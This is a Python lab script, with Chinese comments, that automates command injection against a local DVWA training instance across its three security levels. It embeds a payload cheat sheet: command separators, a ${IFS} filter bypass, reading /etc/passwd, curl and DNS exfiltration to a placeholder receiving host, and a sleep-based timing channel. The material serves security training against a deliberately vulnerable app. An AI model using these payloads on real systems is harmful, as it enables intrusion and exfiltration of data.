#!/usr/bin/env python3
"""18 · 命令注入与 DVWA 综合通关 —— payload 速查与三档利用

用法:
    python3 cmd_lab.py gen                                      # 生成 payload 速查表
    python3 cmd_lab.py run --level low|medium|high \
        --ip "127.0.0.1; whoami" [--grep 串]

run 把 --ip 原样提交给 DVWA 的 Command Injection 模块（POST
/vulnerabilities/exec/），从响应的 <pre> 块取回显：默认打印最后一行，
--grep 时打印首个命中行。所有请求只发往本机靶场。
"""
import argparse
import re
import sys
import time
from pathlib import Path

import requests

BASE = "http://127.0.0.1:8080"
EXEC = f"{BASE}/vulnerabilities/exec/"
ART = Path(__file__).parent / "artifacts"
TOKEN_RE = r"name='user_token' value='([^']+)'"


def _get(s, url, **kw):
    """GET 带两次重试：本地 Docker 端口代理偶尔抖动，最多重试 3 次。"""
    kw.setdefault("timeout", 8)
    last = None
    for _ in range(3):
        try:
            return s.get(url, **kw)
        except requests.RequestException as e:
            last = e
            time.sleep(1)
    raise last

PAYLOAD_TABLE = """\
# 18 · 命令注入 payload 速查（注入点：ip 参数）
# —— low：无过滤，四式随意
127.0.0.1; whoami                  # 分号：串行执行
127.0.0.1 | id                     # 管道：把 ping 输出灌给 id
127.0.0.1 `id`                     # 反引号：命令替换
127.0.0.1; echo $(id)              # $()：命令替换（现代写法）
# —— medium：删掉了 && 和 ;
127.0.0.1 | whoami                 # 管道照走
127.0.0.1 & whoami                 # 单个 & 照走
127.0.0.1 `whoami`                 # 反引号照走
127.0.0.1|cat${IFS}/etc/passwd     # ${IFS}＝空格，绕过空格审查
# —— high：|| & ; |␣ - $ ( ) ` 全删
127.0.0.1|whoami                   # 管道变体：| 后不加空格即存活
127.0.0.1|cat /etc/passwd          # 管道后接带参命令，参数内空格照用
# —— 无回显时的三条外带路
127.0.0.1|curl http://接收端/$(whoami)   # HTTP 外带（目标需能出网）
127.0.0.1|nslookup $(whoami).我的域名     # DNS 外带（目标需能解析）
127.0.0.1|sleep 5                        # 时间信道：0/5 秒当 1 比特
"""


def login(level="low"):
    s = requests.Session()
    r = _get(s, f"{BASE}/login.php")
    tok = re.search(TOKEN_RE, r.text).group(1)
    s.post(f"{BASE}/login.php", timeout=8,
           data={"username": "admin", "password": "password",
                 "Login": "Login", "user_token": tok})
    r = _get(s, f"{BASE}/security.php")
    tok = re.search(TOKEN_RE, r.text).group(1)
    s.post(f"{BASE}/security.php", timeout=8,
           data={"security": level, "seclev_submit": "Submit", "user_token": tok})
    return s


def cmd_gen(a):
    ART.mkdir(exist_ok=True)
    (ART / "payloads.txt").write_text(PAYLOAD_TABLE, encoding="utf-8")
    print("[gen] payload 速查表 → artifacts/payloads.txt")
    print(PAYLOAD_TABLE.rstrip())
    return 0


def cmd_run(a):
    s = login(a.level)
    r = s.post(EXEC, data={"ip": a.ip, "Submit": "Submit"}, timeout=10)
    m = re.search(r"<pre>(.*?)</pre>", r.text, re.S)
    lines = [l for l in (m.group(1) if m else "").splitlines() if l.strip()]
    print(f"[exec] level={a.level} payload：{a.ip}")
    if a.grep:
        hit = next((l for l in lines if a.grep in l), None)
        print(f"[exec] 命中「{a.grep}」的行：{hit if hit else '（无）'}")
        return 0 if hit else 1
    print(f"[exec] 回显末行：{lines[-1] if lines else '（空响应）'}")
    return 0


def main():
    ap = argparse.ArgumentParser(description="命令注入三档利用（仅本机 DVWA）")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p0 = sub.add_parser("gen")
    p0.set_defaults(func=cmd_gen)

    p1 = sub.add_parser("run")
    p1.add_argument("--level", default="low", choices=["low", "medium", "high"])
    p1.add_argument("--ip", required=True, help="注入串（将原样提交给 ip 参数）")
    p1.add_argument("--grep", default=None, help="改为打印首个包含该子串的回显行")
    p1.set_defaults(func=cmd_run)

    args = ap.parse_args()
    return args.func(args)


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] 已中断", file=sys.stderr)
        sys.exit(130)
